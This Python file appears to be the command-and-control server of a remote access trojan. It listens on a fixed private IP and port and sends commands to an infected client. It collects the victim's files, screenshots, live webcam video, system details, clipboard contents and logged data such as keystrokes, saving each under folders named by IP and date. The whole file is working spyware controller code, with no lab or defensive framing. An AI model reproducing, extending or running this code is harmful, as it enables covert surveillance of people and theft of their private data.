import argparse
import base64
import json
import os
import socket
import threading
import time

import cv2
import numpy as np

# Global variables
SCREENSHOT_DIR = 'screenshots/{ip}-{date}'
READ_FILE_DIR = 'reads/{ip}-{date}'
LOG_FILE_DIR = 'logs/{ip}-{date}'
CLIPBOARD_DIR = 'clipboards/{ip}-{date}'
last_client_socket = None
stop = False


# Function to set up the command line arguments
def args_parse(command_line=None):
    parser = argparse.ArgumentParser(description='Server of file receiver')
    parser.add_argument('-l', '--listen', type=int, default=9809, help='Port to listen on')
    parser.add_argument('-s', '--show', action='store_true', help='Display the list of files received')
    parser.add_argument('-r', '--readfile', nargs='*', type=str, help='Read the content of a file')
    parser.add_argument('-k', '--kill', action='store_true', help='Kill the server and delete client files')
    parser.add_argument('-c', '--capture', action='store_true', help='Capture the webcam of the client')
    parser.add_argument('-S', '--screenshot', action='store_true', help='Take a screenshot')
    parser.add_argument("-sys", "--system", action="store_true", help="Display system information of the client")

    if command_line:
        return parser.parse_args(command_line)
    else:
        return parser.parse_args()


# Function to create the server socket
def create_server_socket(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    return server_socket


# Function to handle the command line
def command_handler_loop(server_socket):
    global stop
    while not stop:
        try:
            command_line = input("Server > ")
            args = args_parse(command_line.split())
            if args.show:
                show_files('.')
            elif args.readfile:
                filename = ' '.join(args.readfile)
                read_file(filename)
            elif args.kill:
                kill_client()
            elif args.screenshot:
                take_screenshot()
            elif args.capture:
                receive_webcam_live()
            elif args.system:
                display_system_info()
        except KeyboardInterrupt:
            print("\n")
            if last_client_socket:
                last_client_socket.close()
            server_socket.close()
            os._exit(0)
        except SystemExit:
            pass
        except Exception as e:
            print(f"Error: {e}")
            continue


# Function to show the files received from the client
def show_files(path):
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to show files.")
        return

    try:
        command = {
            'command': 'SHOW',
            'path': path
        }
        last_client_socket.send(json.dumps(command).encode())
    except socket.error as e:
        print(f"Error sending show files command: {e}")
    pass


# Function to display the system information of the client
def display_system_info():
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to display system information.")
        return

    try:
        command = {
            'command': 'SYSTEM'
        }
        last_client_socket.send(json.dumps(command).encode())
    except socket.error as e:
        print(f"Error sending system information command: {e}")
    pass


# Function to read the content of a file received from the client
def read_file(filename):
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to read file.")
        return

    try:
        command = {
            'command': 'READ',
            'filename': filename
        }
        last_client_socket.send(json.dumps(command).encode())
    except socket.error as e:
        print(f"Error sending read file command: {e}")


# Function to take a screenshot from the client
def take_screenshot():
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to take screenshot.")
        return

    try:
        command = {
            'command': 'SCREENSHOT'
        }
        last_client_socket.send(json.dumps(command).encode())
    except socket.error as e:
        print(f"Error sending screenshot command: {e}")


# Function to receive the webcam live from the client
def receive_webcam_live():
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to receive webcam.")
        return

    try:
        command = {
            'command': 'WEBCAM'
        }
        last_client_socket.send(json.dumps(command).encode())
        print("Requested webcam from client.")
    except socket.error as e:
        print(f"Error sending webcam command: {e}")


# Function to kill the client
def kill_client():
    global last_client_socket
    if last_client_socket is None:
        print("No client connected to kill.")
        return

    try:
        command = {
            'command': 'KILL'
        }
        last_client_socket.send(json.dumps(command).encode())
        print("Requested kill from client.")
    except socket.error as e:
        print(f"Error sending kill command: {e}")


# Function to handle the client
def handle_client(client_socket, client_address):
    global stop
    while not stop:
        try:
            data = b""
            while True:
                part = client_socket.recv(1024)
                if not part:
                    break
                data += part
                if len(part) < 1024:
                    break

            if not data:
                print(f"Client {client_address} disconnected")
                break

            try:
                client_info = json.loads(data.decode())
                data_command = client_info.get('command')

                ip = client_address[0]
                date = time.strftime("%d%m%Y")

                if data_command == 'LOG':
                    filename = client_info['filename']
                    filename = filename.split('-')[1]
                    file_content = client_info['file_content']
                    file_content_bytes = base64.b64decode(file_content)
                    dir_name = LOG_FILE_DIR.format(ip=ip, date=date)

                    if not os.path.exists(dir_name):
                        os.makedirs(dir_name)

                    with open(dir_name + '/' + filename, 'wb') as f:
                        f.write(file_content_bytes)

                if data_command == 'COPY':
                    filename = client_info['filename']
                    clipboard_content = client_info['clipboard_content']
                    clipboard_content_bytes = base64.b64decode(clipboard_content)
                    dir_name = CLIPBOARD_DIR.format(ip=ip, date=date)

                    if not os.path.exists(dir_name):
                        os.makedirs(dir_name)

                    with open(dir_name + '/' + filename, 'ab') as f:
                        f.write(clipboard_content_bytes)
                        f.write(b'\n')

                elif data_command == 'READ':
                    global READ_FILE_DIR
                    filename = client_info['filename'].split('\\')[-1]
                    file_content = client_info['file_content']
                    dir_name = READ_FILE_DIR.format(ip=ip, date=date)
                    file_content_bytes = base64.b64decode(file_content)

                    if not os.path.exists(dir_name):
                        os.makedirs(dir_name)

                    with open(dir_name + '/' + filename, 'wb') as f:
                        f.write(file_content_bytes)
                        print(f"File {filename} saved to {dir_name}")

                elif data_command == 'SHOW':
                    files = client_info['files']
                    print("\nFiles or directories:")
                    for file in files:
                        print(f"{file['name']} ({file['type']})")

                elif data_command == 'SCREENSHOT':
                    global SCREENSHOT_DIR
                    screenshot = client_info['screenshot']
                    screenshot_bytes = base64.b64decode(screenshot)
                    current_time = time.strftime("%Hh-%Mmin-%Ss")
                    dir_name = SCREENSHOT_DIR.format(ip=ip, date=date)

                    if not os.path.exists(dir_name):
                        os.makedirs(dir_name)

                    with open(dir_name + '/' + current_time + '.png', 'wb') as f:
                        f.write(screenshot_bytes)
                        print(f"Screenshot saved to {dir_name}")

                elif data_command == 'WEBCAM':
                    image_encoded = client_info['image']
                    image_bytes = base64.b64decode(image_encoded)
                    image = cv2.imdecode(np.frombuffer(image_bytes, np.uint8), cv2.IMREAD_COLOR)

                    cv2.namedWindow(f"Webcam {client_address}")
                    cv2.imshow(f"Webcam {client_address}", image)

                    if cv2.waitKey(1) & 0xFF == ord('q'):
                        cv2.destroyAllWindows()
                        client_info = {
                            'command': 'WEBCAM'
                        }
                        json_data = json.dumps(client_info)
                        client_socket.send(json_data.encode())

                elif data_command == 'SYSTEM':
                    system = client_info['system']
                    node = client_info['node']
                    release = client_info['release']
                    version = client_info['version']
                    machine = client_info['machine']
                    processor = client_info['processor']
                    print(f"System information from client {client_address}:")
                    print(f"System: {system}")
                    print(f"Node: {node}")
                    print(f"Release: {release}")
                    print(f"Version: {version}")
                    print(f"Machine: {machine}")
                    print(f"Processor: {processor}")

                elif data_command == 'KILL':
                    stop = client_info['stop']
                    if stop:
                        print("Killing server...")
                        client_socket.close()
                        os._exit(0)
                        break

                elif data_command == 'ERROR':
                    error = client_info['error']
                    print(f"Error from client: {error}")

            except json.JSONDecodeError as e:
                print(f"JSON decode error: {e}")

        except socket.error as e:
            print(f"Socket error with {client_address}: {e}")
            break

    client_socket.close()
    print(f"Connection with {client_address} closed")


# Function to accept connections from the client
def accept_connections(server_socket):
    global last_client_socket, stop
    while not stop:
        client_socket, client_address = server_socket.accept()
        last_client_socket = client_socket
        print(f"Connection with {client_address} established")
        client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        client_thread.start()


# Main function
def main():
    args = args_parse()
    host = '172.20.10.3'
    port = args.listen
    server_socket = create_server_socket(host, port)
    accept_thread = threading.Thread(target=accept_connections, args=(server_socket,))
    accept_thread.start()
    command_handler_loop(server_socket)


if __name__ == '__main__':
    main()
